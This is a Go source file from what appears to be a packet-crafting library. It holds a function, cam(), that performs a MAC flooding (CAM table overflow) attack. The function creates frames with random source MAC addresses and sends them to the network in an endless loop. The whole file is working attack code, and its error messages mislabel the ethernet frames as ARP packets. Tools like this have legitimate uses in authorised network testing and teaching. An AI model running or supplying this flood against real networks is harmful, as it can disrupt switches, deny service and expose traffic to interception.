package higherlevel

import (
	"fmt"
	"sync"

	craft "github.com/tiagomdiogo/GoPpy/packet"
	communication "github.com/tiagomdiogo/GoPpy/supersocket"
	utils "github.com/tiagomdiogo/GoPpy/utils"
)

func cam(iface, dstMAC string, packetCount int) {

	ss, err := communication.NewSuperSocket(iface, "")
	if err != nil {
		fmt.Println("Error creating SuperSocket:", err)
		return
	}

	packets := make([][]byte, packetCount)
	var wg sync.WaitGroup

	for i := 0; i < packetCount; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			randomSrcMAC, err := utils.ParseMACGen("")
			if err != nil {
				fmt.Println("Error crafting ARP packet:", err)
				return
			}
			arpPacket, err := craft.CraftEthernetPacket(randomSrcMAC, dstMAC, "")
			if err != nil {
				fmt.Println("Error crafting ARP packet:", err)
				return
			}
			packets[i] = arpPacket
		}(i)
	}

	wg.Wait()

	// Flood the network with the ARP packets
	for {
		err = ss.SendMultiplePackets(packets, 10)
		if err != nil {
			fmt.Println("Error sending packets:", err)
			return
		}
	}
}
